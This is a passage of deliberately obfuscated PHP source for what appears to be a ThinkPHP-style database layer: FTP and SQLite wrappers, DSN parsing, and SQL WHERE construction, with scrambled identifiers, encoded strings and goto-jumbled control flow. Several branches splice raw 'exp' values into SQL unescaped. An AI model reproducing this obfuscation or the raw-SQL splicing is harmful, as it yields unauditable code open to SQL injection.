$Fƒ–•⁄Í¥⁄); if ($EŒàÕë∫©⁄ != -1) { $f‡àèÓ„ °[$BË∂åµÿÊπ[78]] = $EŒàÕë∫©⁄; } else { $bŸ—ëÍ±„ù = @ftp_chdir($this->connect, $Fƒ–•⁄Í¥⁄); if (!$bŸ—ëÍ±„ù) { return !1; } $f‡àèÓ„ °[$BË∂åµÿÊπ[29]] = $BË∂åµÿÊπ[77]; } return $f‡àèÓ„ °; goto dæ ßôÌ¨È; bäÜâ·√ ≥: $BË∂åµÿÊπ =& $_SERVER[Öíæ€“”≠éÏË]; if ($Fƒ–•⁄Í¥⁄ == $BË∂åµÿÊπ[33] || $Fƒ–•⁄Í¥⁄ == $BË∂åµÿÊπ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto Eº¡”ˆ⁄À¯; dæ ßôÌ¨È: } protected function _isFolder($E≠ìÒΩÓÇ◊) { $fè´§©√–Ñ =& $_SERVER[Öíæ€“”≠éÏË]; if ($E≠ìÒΩÓÇ◊ == $fè´§©√–Ñ[33] || $E≠ìÒΩÓÇ◊ == $fè´§©√–Ñ[8]) { return !0; } $d∆–ØÕÂ”∞ = $this->_objectMeta($E≠ìÒΩÓÇ◊); return isset($d∆–ØÕÂ”∞[$fè´§©√–Ñ[29]]) && $d∆–ØÕÂ”∞[$fè´§©√–Ñ[29]] == $fè´§©√–Ñ[77] ? !0 : !1; } } goto a¯‰íç◊µ™; Bäïéµ¬Ãö: class DbSqlite extends DbSqliteBase { public function query($B £≈‹œ∂±) { $B»»πÎ¯∑Ó =& $_SERVER[Öíæ€“”≠éÏË]; if (!CacheLock::fileLock($B»»πÎ¯∑Ó[9])) { return !1; } $eÇÊû°®Âé = parent::query($B £≈‹œ∂±); CacheLock::fileUnLock($B»»πÎ¯∑Ó[9]); return $eÇÊû°®Âé; } public function execute($D‡ûíµÇƒ∑) { $aÇ≈ı¿–æﬂ =& $_SERVER[Öíæ€“”≠éÏË]; if (!CacheLock::fileLock($aÇ≈ı¿–æﬂ[9])) { return !1; } $CäÍÓûË…õ = parent::execute($D‡ûíµÇƒ∑); CacheLock::fileUnLock($aÇ≈ı¿–æﬂ[9]); return $CäÍÓûË…õ; } } class DbSqlite3 extends DbSqlite3Base { public function query($a°ô∂·ÈÎò) { $BŸüÃÉ•Çâ =& $_SERVER[Öíæ€“”≠éÏË]; if (!CacheLock::fileLock($BŸüÃÉ•Çâ[9])) { return !1; } $fÚæßËÓÊ = parent::query($a°ô∂·ÈÎò); CacheLock::fileUnLock($BŸüÃÉ•Çâ[9]); return $fÚæßËÓÊ; } public function execute($Då∑°ÀƒÍ∑) { $eãÓ∏ÀÊ é =& $_SERVER[Öíæ€“”≠éÏË]; if (!CacheLock::fileLock($eãÓ∏ÀÊ é[9])) { return !1; } $BºÏ∫∫ëÁ = parent::execute($Då∑°ÀƒÍ∑); CacheLock::fileUnLock($eãÓ∏ÀÊ é[9]); return $BºÏ∫∫ëÁ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\161" => "\x3c\76", "\x67\x74" => "\76", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\74", "\x65\x6c\164" => "\74\75", "\156\x6f\164\154\151\x6b\145" => "\x4e\117\x54\x20\x4c\111\113\105", "\x6c\151\x6b\145" => "\x4c\111\x4b\x45", "\x69\x6e" => "\x49\116", "\156\x6f\x74\x69\x6e" => "\x4e\117\124\40\x49\116", "\156\x6f\164\x20\151\x6e" => "\116\117\x54\x20\x49\x4e", "\142\x65\164\x77\145\x65\x6e" => "\x42\x45\124\127\x45\x45\116", "\156\157\x74\x62\145\164\x77\x65\x65\156" => "\x4e\117\124\40\102\105\x54\x57\x45\105\x4e", "\x6e\157\x74\x20\x62\145\164\x77\x65\145\156" => "\116\117\124\40\x42\x45\x54\127\105\x45\116"); protected $selectSql = "\x53\105\x4c\x45\x43\124\45\104\x49\x53\124\x49\116\x43\x54\45\x20\45\x46\111\105\x4c\x44\45\40\x46\x52\117\x4d\40\45\x54\x41\x42\114\x45\x25\45\x4a\117\111\116\x25\x25\127\110\x45\x52\x45\x25\45\x47\x52\x4f\x55\x50\45\45\110\101\126\x49\116\x47\45\45\x4f\122\x44\x45\x52\45\x25\x4c\111\x4d\111\x54\x25\40\45\x55\116\x49\x4f\x4e\45\45\103\117\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $Fïïùò¬—¡ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Öíæ€“”≠éÏË][930], $Fïïùò¬—¡); } public function factory($C†√¬Ì†ß¥ = '') { goto B∏„‹Í≤çß; b›Ô◊ﬁÈ–á: return $cé≤“πÇî£; goto B‘ø„˜Ù•º; B∏„‹Í≤çß: $d—•›‘¡ı” =& $_SERVER[Öíæ€“”≠éÏË]; $C†√¬Ì†ß¥ = $this->parseConfig($C†√¬Ì†ß¥); if (empty($C†√¬Ì†ß¥[$d—•›‘¡ı”[931]])) { think_exception(think_lang($d—•›‘¡ı”[932])); } goto eÜèﬁ–ñ‘Ê; eÜèﬁ–ñ‘Ê: $this->dbType = ucwords(strtolower($C†√¬Ì†ß¥[$d—•›‘¡ı”[931]])); $EÌãî˜€´∏ = $d—•›‘¡ı”[933] . $this->dbType; if (class_exists($EÌãî˜€´∏)) { $cé≤“πÇî£ = new $EÌãî˜€´∏($C†√¬Ì†ß¥); if ($d—•›‘¡ı”[768] != strtolower($C†√¬Ì†ß¥[$d—•›‘¡ı”[931]])) { $cé≤“πÇî£->dbType = strtoupper($this->dbType); } else { $cé≤“πÇî£->dbType = $this->_getDsnType($C†√¬Ì†ß¥[$d—•›‘¡ı”[886]]); } } else { think_exception(think_lang($d—•›‘¡ı”[934]) . $d—•›‘¡ı”[935] . $EÌãî˜€´∏); } goto b›Ô◊ﬁÈ–á; B‘ø„˜Ù•º: } public function __call($c∫ÁôÍ∞Œ¿, $e∆¢çÊçœ¡) { if (method_exists($this, $c∫ÁôÍ∞Œ¿)) { return call_user_func_array(array($this, $c∫ÁôÍ∞Œ¿), $e∆¢çÊçœ¡); } } protected function _getDsnType($AÑ€‘¿íÀÖ) { $e´Ωÿ«Ωö» = explode($_SERVER[Öíæ€“”≠éÏË][4], $AÑ€‘¿íÀÖ); $b´ˆ∑®≠ˆä = strtoupper(trim($e´Ωÿ«Ωö»[0])); return $b´ˆ∑®≠ˆä; } private function parseConfig($D–Ÿø€ìì™ = '') { $eõØΩø§≠· =& $_SERVER[Öíæ€“”≠éÏË]; if (!empty($D–Ÿø€ìì™) && is_string($D–Ÿø€ìì™)) { $D–Ÿø€ìì™ = $this->parseDSN($D–Ÿø€ìì™); } elseif (is_array($D–Ÿø€ìì™)) { $D–Ÿø€ìì™ = array_change_key_case($D–Ÿø€ìì™); $D–Ÿø€ìì™ = array($eõØΩø§≠·[931] => $D–Ÿø€ìì™[$eõØΩø§≠·[767]], $eõØΩø§≠·[859] => $D–Ÿø€ìì™[$eõØΩø§≠·[936]], $eõØΩø§≠·[860] => $D–Ÿø€ìì™[$eõØΩø§≠·[937]], $eõØΩø§≠·[857] => $D–Ÿø€ìì™[$eõØΩø§≠·[938]], $eõØΩø§≠·[858] => $D–Ÿø€ìì™[$eõØΩø§≠·[939]], $eõØΩø§≠·[17] => $D–Ÿø€ìì™[$eõØΩø§≠·[940]], $eõØΩø§≠·[886] => $D–Ÿø€ìì™[$eõØΩø§≠·[769]], $eõØΩø§≠·[13] => isset($D–Ÿø€ìì™[$eõØΩø§≠·[941]]) ? $D–Ÿø€ìì™[$eõØΩø§≠·[941]] : array()); } elseif (empty($D–Ÿø€ìì™)) { if (think_config($eõØΩø§≠·[942]) && $eõØΩø§≠·[768] != strtolower(think_config($eõØΩø§≠·[943]))) { $D–Ÿø€ìì™ = $this->parseDSN(think_config($eõØΩø§≠·[942])); } else { $D–Ÿø€ìì™ = array($eõØΩø§≠·[931] => think_config($eõØΩø§≠·[943]), $eõØΩø§≠·[859] => think_config($eõØΩø§≠·[944]), $eõØΩø§≠·[860] => think_config($eõØΩø§≠·[945]), $eõØΩø§≠·[857] => think_config($eõØΩø§≠·[946]), $eõØΩø§≠·[858] => think_config($eõØΩø§≠·[947]), $eõØΩø§≠·[17] => think_config($eõØΩø§≠·[244]), $eõØΩø§≠·[886] => think_config($eõØΩø§≠·[942]), $eõØΩø§≠·[13] => think_config($eõØΩø§≠·[948])); } } return $D–Ÿø€ìì™; } protected function initConnect($A„ôøﬂÜÂÉ = true) { if (1 == think_config($_SERVER[Öíæ€“”≠éÏË][18])) { $this->_linkID = $this->multiConnect($A„ôøﬂÜÂÉ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $EôâÎ‹®·Ÿ => $Fúàäè´ëŒ) { $this->_linkID = $Fúàäè´ëŒ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($bû∂Ç¢í‘… = false) { goto aã˘°ë≤Ü‘; C…œ¡∏ºãÎ: if (empty($Eò»π†”«Ü)) { foreach ($this->config as $bã¥ºâÊ÷ => $dµ√’ü¶É‹) { $Eò»π†”«Ü[$bã¥ºâÊ÷] = explode($DôÊ†®Ú‚û[47], $dµ√’ü¶É‹); } } if (think_config($DôÊ†®Ú‚û[949])) { if ($bû∂Ç¢í‘… || think_config($DôÊ†®Ú‚û[390]) === !0) { $C¢ëº”Ã¶÷ = floor(mt_rand(0, think_config($DôÊ†®Ú‚û[950]) - 1)); $E†íåÉ»Æ = $C¢ëº”Ã¶÷; } else { if (is_numeric(think_config($DôÊ†®Ú‚û[951]))) { $C¢ëº”Ã¶÷ = think_config($DôÊ†®Ú‚û[951]); } else { $C¢ëº”Ã¶÷ = floor(mt_rand(think_config($DôÊ†®Ú‚û[950]), count($Eò»π†”«Ü[$DôÊ†®Ú‚û[857]]) - 1)); } } } else { $C¢ëº”Ã¶÷ = floor(mt_rand(0, count($Eò»π†”«Ü[$DôÊ†®Ú‚û[857]]) - 1)); $E†íåÉ»Æ = $C¢ëº”Ã¶÷; } $C¢ëº”Ã¶÷ = $E†íåÉ»Æ !== -1 ? $E†íåÉ»Æ : $C¢ëº”Ã¶÷; goto EÎ„ùèÂç ; EÎ„ùèÂç : $d‡ãè◊Ãπè = array($DôÊ†®Ú‚û[859] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[859]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[859]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[859]][0], $DôÊ†®Ú‚û[860] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[860]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[860]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[860]][0], $DôÊ†®Ú‚û[857] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[857]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[857]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[857]][0], $DôÊ†®Ú‚û[858] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[858]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[858]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[858]][0], $DôÊ†®Ú‚û[17] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[17]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[17]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[17]][0], $DôÊ†®Ú‚û[886] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[886]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[886]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[886]][0], $DôÊ†®Ú‚û[13] => isset($Eò»π†”«Ü[$DôÊ†®Ú‚û[13]][$C¢ëº”Ã¶÷]) ? $Eò»π†”«Ü[$DôÊ†®Ú‚û[13]][$C¢ëº”Ã¶÷] : $Eò»π†”«Ü[$DôÊ†®Ú‚û[13]][0]); return $this->connect($d‡ãè◊Ãπè, $C¢ëº”Ã¶÷); goto CÚ¨æŸ†à«; aã˘°ë≤Ü‘: $DôÊ†®Ú‚û =& $_SERVER[Öíæ€“”≠éÏË]; static $Eò»π†”«Ü = array(); static $E†íåÉ»Æ = -1; goto C…œ¡∏ºãÎ; CÚ¨æŸ†à«: } public function parseDSN($eò∏Ê§¥Ω∞) { $c˜ÚØ°Ãœ√ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($eò∏Ê§¥Ω∞)) { return !1; } $B∂≠Ô›ÇÀ˜ = parse_url($eò∏Ê§¥Ω∞); if ($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[174]]) { $EÑÉˆ˘ÖãÇ = array($c˜ÚØ°Ãœ√[931] => $B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[174]], $c˜ÚØ°Ãœ√[859] => isset($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[576]]) ? $B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[576]] : $c˜ÚØ°Ãœ√[33], $c˜ÚØ°Ãœ√[860] => isset($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[952]]) ? $B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[952]] : $c˜ÚØ°Ãœ√[33], $c˜ÚØ°Ãœ√[857] => isset($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[175]]) ? $B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[175]] : $c˜ÚØ°Ãœ√[33], $c˜ÚØ°Ãœ√[858] => isset($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[176]]) ? $B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[176]] : $c˜ÚØ°Ãœ√[33], $c˜ÚØ°Ãœ√[17] => isset($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[76]]) ? substr($B∂≠Ô›ÇÀ˜[$c˜ÚØ°Ãœ√[76]], 1) : $c˜ÚØ°Ãœ√[33]); } else { preg_match($c˜ÚØ°Ãœ√[953], trim($eò∏Ê§¥Ω∞), $eÌÉãñ·ñ≤); $EÑÉˆ˘ÖãÇ = array($c˜ÚØ°Ãœ√[931] => $eÌÉãñ·ñ≤[1], $c˜ÚØ°Ãœ√[859] => $eÌÉãñ·ñ≤[2], $c˜ÚØ°Ãœ√[860] => $eÌÉãñ·ñ≤[3], $c˜ÚØ°Ãœ√[857] => $eÌÉãñ·ñ≤[4], $c˜ÚØ°Ãœ√[858] => $eÌÉãñ·ñ≤[5], $c˜ÚØ°Ãœ√[17] => $eÌÉãñ·ñ≤[6]); } $EÑÉˆ˘ÖãÇ[$c˜ÚØ°Ãœ√[886]] = $c˜ÚØ°Ãœ√[33]; return $EÑÉˆ˘ÖãÇ; } protected function debug() { $A∫Œå∑…ƒÜ =& $_SERVER[Öíæ€“”≠éÏË]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $A∫Œå∑…ƒÜ[954]; if (think_config($A∫Œå∑…ƒÜ[955])) { think_status($A∫Œå∑…ƒÜ[956]); think_trace($this->queryStr . $A∫Œå∑…ƒÜ[957] . think_status($A∫Œå∑…ƒÜ[20], $A∫Œå∑…ƒÜ[956], 6) . $A∫Œå∑…ƒÜ[958], $A∫Œå∑…ƒÜ[33], $A∫Œå∑…ƒÜ[959]); } } protected function parseLock($C£¨øÀºé¡ = false) { $fé¥û™ôïÌ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$C£¨øÀºé¡) { return $fé¥û™ôïÌ[33]; } if ($fé¥û™ôïÌ[888] == $this->dbType) { return $fé¥û™ôïÌ[960]; } return $fé¥û™ôïÌ[961]; } protected function parseSet($C∫Ò‡∏Æ“Ñ) { $f¢ææñêúß =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($C∫Ò‡∏Æ“Ñ as $D–úº∏Ç•ù => $DË‰°¨µ¯ñ) { if (is_array($DË‰°¨µ¯ñ) && $f¢ææñêúß[295] == $DË‰°¨µ¯ñ[0]) { $CÖêÌâêæ—[] = $this->parseKey($D–úº∏Ç•ù) . $f¢ææñêúß[962] . $DË‰°¨µ¯ñ[1]; } elseif (is_scalar($DË‰°¨µ¯ñ) || is_null($DË‰°¨µ¯ñ)) { $CÖêÌâêæ—[] = $this->parseKey($D–úº∏Ç•ù) . $f¢ææñêúß[962] . $this->parseValue($DË‰°¨µ¯ñ); } } return $f¢ææñêúß[963] . implode($f¢ææñêúß[47], $CÖêÌâêæ—); } protected function bindParam($AÿåÔ™Ï´Æ, $eÙ£≠§ÇΩÀ) { $this->bind[$_SERVER[Öíæ€“”≠éÏË][4] . $AÿåÔ™Ï´Æ] = $eÙ£≠§ÇΩÀ; } protected function parseBind($bŸ¢Íçââ‡) { $bŸ¢Íçââ‡ = array_merge($this->bind, $bŸ¢Íçââ‡); $this->bind = array(); return $bŸ¢Íçââ‡; } function parseKey(&$c¯Úê•á¯›, $aÍπ«Úàç¶ = true) { if ($aÍπ«Úàç¶) { $c¯Úê•á¯› = $this->parseKeyCheck($c¯Úê•á¯›); } return $c¯Úê•á¯›; } function parseKeyCheck($D¿´…”ôÍ›) { $aû∆Íı·ê  =& $_SERVER[Öíæ€“”≠éÏË]; $D¿´…”ôÍ› = trim($D¿´…”ôÍ›); if (!preg_match($aû∆Íı·ê [964], $D¿´…”ôÍ›)) { think_exception($aû∆Íı·ê [965] . $D¿´…”ôÍ›); } return $D¿´…”ôÍ›; } protected function parseValue($e€å˜êÈ‚Ø) { $b…”âßòè° =& $_SERVER[Öíæ€“”≠éÏË]; if (is_string($e€å˜êÈ‚Ø)) { $e€å˜êÈ‚Ø = $b…”âßòè°[927] . $this->escapeString($e€å˜êÈ‚Ø) . $b…”âßòè°[927]; } elseif (isset($e€å˜êÈ‚Ø[0]) && is_string($e€å˜êÈ‚Ø[0]) && strtolower($e€å˜êÈ‚Ø[0]) == $b…”âßòè°[295]) { $e€å˜êÈ‚Ø = $this->escapeString($e€å˜êÈ‚Ø[1]); } elseif (is_array($e€å˜êÈ‚Ø)) { $e€å˜êÈ‚Ø = array_map(array($this, $b…”âßòè°[928]), $e€å˜êÈ‚Ø); } elseif (is_bool($e€å˜êÈ‚Ø)) { $e€å˜êÈ‚Ø = $e€å˜êÈ‚Ø ? $b…”âßòè°[87] : $b…”âßòè°[191]; } elseif (is_null($e€å˜êÈ‚Ø)) { $e€å˜êÈ‚Ø = $b…”âßòè°[103]; } return $e€å˜êÈ‚Ø; } protected function parseField($E›‰ø»◊ñ™) { $cŒáå≤Î°œ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_string($E›‰ø»◊ñ™) && strpos($E›‰ø»◊ñ™, $cŒáå≤Î°œ[47])) { $E›‰ø»◊ñ™ = explode($cŒáå≤Î°œ[47], $E›‰ø»◊ñ™); } if (is_array($E›‰ø»◊ñ™)) { $f”ûÚåÆáÔ = array(); foreach ($E›‰ø»◊ñ™ as $EÕ∑úà®Ãı => $A˘—ãäŸ€—) { if (!is_numeric($EÕ∑úà®Ãı)) { $f”ûÚåÆáÔ[] = $this->parseKey($EÕ∑úà®Ãı, !1) . $cŒáå≤Î°œ[966] . $this->parseKey($A˘—ãäŸ€—); } else { $f”ûÚåÆáÔ[] = $this->parseKey($A˘—ãäŸ€—); } } $cÀÇ∏∫ÿçÚ = implode($cŒáå≤Î°œ[47], $f”ûÚåÆáÔ); } elseif (is_string($E›‰ø»◊ñ™) && !empty($E›‰ø»◊ñ™)) { $cÀÇ∏∫ÿçÚ = $E›‰ø»◊ñ™; } else { $cÀÇ∏∫ÿçÚ = $cŒáå≤Î°œ[182]; } return $cÀÇ∏∫ÿçÚ; } protected function parseTable($aŸãÆ∏âÂë) { $Fëë éÃíê =& $_SERVER[Öíæ€“”≠éÏË]; if (is_array($aŸãÆ∏âÂë)) { $DƒÂÉÛøÑÓ = array(); foreach ($aŸãÆ∏âÂë as $fï‹Ï¬—ıù => $Dº€“Ë•…„) { if (!is_numeric($fï‹Ï¬—ıù)) { $DƒÂÉÛøÑÓ[] = $this->parseKey($fï‹Ï¬—ıù) . $Fëë éÃíê[50] . $this->parseKey($Dº€“Ë•…„); } else { $DƒÂÉÛøÑÓ[] = $this->parseKey($fï‹Ï¬—ıù); } } $aŸãÆ∏âÂë = $DƒÂÉÛøÑÓ; } elseif (is_string($aŸãÆ∏âÂë)) { if (strstr($aŸãÆ∏âÂë, $Fëë éÃíê[50])) { return $aŸãÆ∏âÂë; } $aŸãÆ∏âÂë = explode($Fëë éÃíê[47], $aŸãÆ∏âÂë); array_walk($aŸãÆ∏âÂë, array($this, $Fëë éÃíê[877])); } return $Fëë éÃíê[871] . trim(implode($Fëë éÃíê[967], $aŸãÆ∏âÂë), $Fëë éÃíê[382]) . $Fëë éÃíê[871]; } protected function parseWhere($F¢Í·–˜ıÿ) { $aÍÆàÉæèÊ =& $_SERVER[Öíæ€“”≠éÏË]; $B¡¥í∑ç€≠ = $aÍÆàÉæèÊ[33]; if (is_string($F¢Í·–˜ıÿ)) { $B¡¥í∑ç€≠ = $F¢Í·–˜ıÿ; } else { $aà∏È∑÷⁄÷ = isset($F¢Í·–˜ıÿ[$aÍÆàÉæèÊ[968]]) ? strtoupper($F¢Í·–˜ıÿ[$aÍÆàÉæèÊ[968]]) : $aÍÆàÉæèÊ[33]; if (in_array($aà∏È∑÷⁄÷, array($aÍÆàÉæèÊ[969], $aÍÆàÉæèÊ[970], $aÍÆàÉæèÊ[971]))) { $aà∏È∑÷⁄÷ = $aÍÆàÉæèÊ[50] . $aà∏È∑÷⁄÷ . $aÍÆàÉæèÊ[50]; unset($F¢Í·–˜ıÿ[$aÍÆàÉæèÊ[968]]); } else { $aà∏È∑÷⁄÷ = $aÍÆàÉæèÊ[972]; } foreach ($F¢Í·–˜ıÿ as $b≠Ñü¢´Ùê => $DÑäòÌ˜å°) { $B¡¥í∑ç€≠ .= $aÍÆàÉæèÊ[275]; if (is_numeric($b≠Ñü¢´Ùê)) { $b≠Ñü¢´Ùê = $aÍÆàÉæèÊ[973]; } if (0 === strpos($b≠Ñü¢´Ùê, $aÍÆàÉæèÊ[71])) { $B¡¥í∑ç€≠ .= $this->parseThinkWhere($b≠Ñü¢´Ùê, $DÑäòÌ˜å°); } else { if (!preg_match($aÍÆàÉæèÊ[974], trim($b≠Ñü¢´Ùê))) { think_exception(think_lang($aÍÆàÉæèÊ[975]) . $aÍÆàÉæèÊ[4] . $b≠Ñü¢´Ùê); } $C‡Ñü˘¥ñæ = is_array($DÑäòÌ˜å°) && isset($DÑäòÌ˜å°[$aÍÆàÉæèÊ[976]]); $b≠Ñü¢´Ùê = trim($b≠Ñü¢´Ùê); if (strpos($b≠Ñü¢´Ùê, $aÍÆàÉæèÊ[281])) { $aƒ…¶˜Ü–â = explode($aÍÆàÉæèÊ[281], $b≠Ñü¢´Ùê); $d¬é∫πãÜ¿ = array(); foreach ($aƒ…¶˜Ü–â as $BËô·íèÚ´ => $b†Óá†ıŒ‚) { $föèñ∞Ïäø = $C‡Ñü˘¥ñæ ? $DÑäòÌ˜å°[$BËô·íèÚ´] : $DÑäòÌ˜å°; $d¬é∫πãÜ¿[] = $aÍÆàÉæèÊ[258] . $this->parseWhereItem($this->parseKey($b†Óá†ıŒ‚), $föèñ∞Ïäø) . $aÍÆàÉæèÊ[876]; } $B¡¥í∑ç€≠ .= implode($aÍÆàÉæèÊ[977], $d¬é∫πãÜ¿); } elseif (strpos($b≠Ñü¢´Ùê, $aÍÆàÉæèÊ[282])) { $aƒ…¶˜Ü–â = explode($aÍÆàÉæèÊ[282], $b≠Ñü¢´Ùê); $d¬é∫πãÜ¿ = array(); foreach ($aƒ…¶˜Ü–â as $BËô·íèÚ´ => $b†Óá†ıŒ‚) { $föèñ∞Ïäø = $C‡Ñü˘¥ñæ ? $DÑäòÌ˜å°[$BËô·íèÚ´] : $DÑäòÌ˜å°; $d¬é∫πãÜ¿[] = $aÍÆàÉæèÊ[258] . $this->parseWhereItem($this->parseKey($b†Óá†ıŒ‚), $föèñ∞Ïäø) . $aÍÆàÉæèÊ[876]; } $B¡¥í∑ç€≠ .= implode($aÍÆàÉæèÊ[972], $d¬é∫πãÜ¿); } else { $B¡¥í∑ç€≠ .= $this->parseWhereItem($this->parseKey($b≠Ñü¢´Ùê), $DÑäòÌ˜å°); } } $B¡¥í∑ç€≠ .= $aÍÆàÉæèÊ[276] . $aà∏È∑÷⁄÷; } $B¡¥í∑ç€≠ = substr($B¡¥í∑ç€≠, 0, -strlen($aà∏È∑÷⁄÷)); } return empty($B¡¥í∑ç€≠) ? $aÍÆàÉæèÊ[33] : $aÍÆàÉæèÊ[978] . $B¡¥í∑ç€≠; } protected function parseWhereItem($Aµú†§–á, $F£ÛºΩ√ë) { $A¢¶÷–œ¬¯ =& $_SERVER[Öíæ€“”≠éÏË]; $cÖ™∂‚∫Ó– = $A¢¶÷–œ¬¯[33]; if (is_array($F£ÛºΩ√ë)) { if (is_string($F£ÛºΩ√ë[0])) { $e´∂†˘Ë…— = strtolower($F£ÛºΩ√ë[0]); if (in_array($F£ÛºΩ√ë[0], array($A¢¶÷–œ¬¯[962], $A¢¶÷–œ¬¯[979], $A¢¶÷–œ¬¯[980], $A¢¶÷–œ¬¯[981], $A¢¶÷–œ¬¯[982], $A¢¶÷–œ¬¯[983]))) { $cÖ™∂‚∫Ó– .= $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $F£ÛºΩ√ë[0] . $A¢¶÷–œ¬¯[50] . $this->parseValue($F£ÛºΩ√ë[1]); } elseif (preg_match($A¢¶÷–œ¬¯[984], $F£ÛºΩ√ë[0])) { $cÖ™∂‚∫Ó– .= $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $this->exp[$e´∂†˘Ë…—] . $A¢¶÷–œ¬¯[50] . $this->parseValue($F£ÛºΩ√ë[1]); } elseif (preg_match($A¢¶÷–œ¬¯[985], $F£ÛºΩ√ë[0])) { if (is_array($F£ÛºΩ√ë[1])) { $b∂Á˘âá¥— = isset($F£ÛºΩ√ë[2]) ? strtoupper($F£ÛºΩ√ë[2]) : $A¢¶÷–œ¬¯[970]; if (in_array($b∂Á˘âá¥—, array($A¢¶÷–œ¬¯[969], $A¢¶÷–œ¬¯[970], $A¢¶÷–œ¬¯[971]))) { $aâΩ‹µÉò’ = array(); foreach ($F£ÛºΩ√ë[1] as $AëôıŒï‰á) { $aâΩ‹µÉò’[] = $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $this->exp[$e´∂†˘Ë…—] . $A¢¶÷–œ¬¯[50] . $this->parseValue($AëôıŒï‰á); } $cÖ™∂‚∫Ó– .= $A¢¶÷–œ¬¯[258] . implode($A¢¶÷–œ¬¯[50] . $b∂Á˘âá¥— . $A¢¶÷–œ¬¯[50], $aâΩ‹µÉò’) . $A¢¶÷–œ¬¯[876]; } } else { $cÖ™∂‚∫Ó– .= $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $this->exp[$e´∂†˘Ë…—] . $A¢¶÷–œ¬¯[50] . $this->parseValue($F£ÛºΩ√ë[1]); } } elseif ($A¢¶÷–œ¬¯[295] == $e´∂†˘Ë…—) { $cÖ™∂‚∫Ó– .= $A¢¶÷–œ¬¯[874] . $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $F£ÛºΩ√ë[1] . $A¢¶÷–œ¬¯[986]; } elseif (preg_match($A¢¶÷–œ¬¯[987], $F£ÛºΩ√ë[0])) { $cÖ™∂‚∫Ó– .= $F£ÛºΩ√ë[0]; } elseif (preg_match($A¢¶÷–œ¬¯[988], $F£ÛºΩ√ë[0])) { if (isset($F£ÛºΩ√ë[2]) && $A¢¶÷–œ¬¯[295] == $F£ÛºΩ√ë[2]) { $cÖ™∂‚∫Ó– .= $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $this->exp[$e´∂†˘Ë…—] . $A¢¶÷–œ¬¯[50] . $F£ÛºΩ√ë[1]; } else { if (is_string($F£ÛºΩ√ë[1])) { $F£ÛºΩ√ë[1] = explode($A¢¶÷–œ¬¯[47], $F£ÛºΩ√ë[1]); } $B‘∏ÍÒ¨µ‘ = implode($A¢¶÷–œ¬¯[47], $this->parseValue($F£ÛºΩ√ë[1])); $cÖ™∂‚∫Ó– .= $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $this->exp[$e´∂†˘Ë…—] . $A¢¶÷–œ¬¯[874] . $B‘∏ÍÒ¨µ‘ . $A¢¶÷–œ¬¯[876]; } } elseif (preg_match($A¢¶÷–œ¬¯[989], $F£ÛºΩ√ë[0])) { $B›¶Èç—Êà = is_string($F£ÛºΩ√ë[1]) ? explode($A¢¶÷–œ¬¯[47], $F£ÛºΩ√ë[1]) : $F£ÛºΩ√ë[1]; $cÖ™∂‚∫Ó– .= $A¢¶÷–œ¬¯[874] . 